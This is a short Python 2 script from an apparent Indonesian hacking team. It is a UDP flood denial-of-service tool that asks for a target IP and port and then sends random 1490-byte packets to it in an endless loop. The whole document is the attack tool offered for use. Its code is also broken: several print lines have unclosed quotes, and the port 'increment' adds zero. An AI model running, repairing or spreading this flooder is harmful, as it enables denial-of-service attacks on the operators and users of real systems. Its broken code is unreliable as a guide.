import sys
import os
import time
import socket
import random
#Perlengkapan Tempur :v
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet ATTACK DDOS THT")
print
print "Creator   : USER003F"
print "Thanks To : R4Hadian"
print "Thanks To : 003T GARUDA
print "Thanks To : X-Hunt312
print "Thanks To : Hunt 3RS
print "Team      : Tengkorak Hacker Team"
print
ip = raw_input("Masukkan IP Target : ")
port = input("Masukkan Port      : ")

os.system("clear")
os.system("figlet Dimulai")
sent = 0
while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     port = port + 0
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 0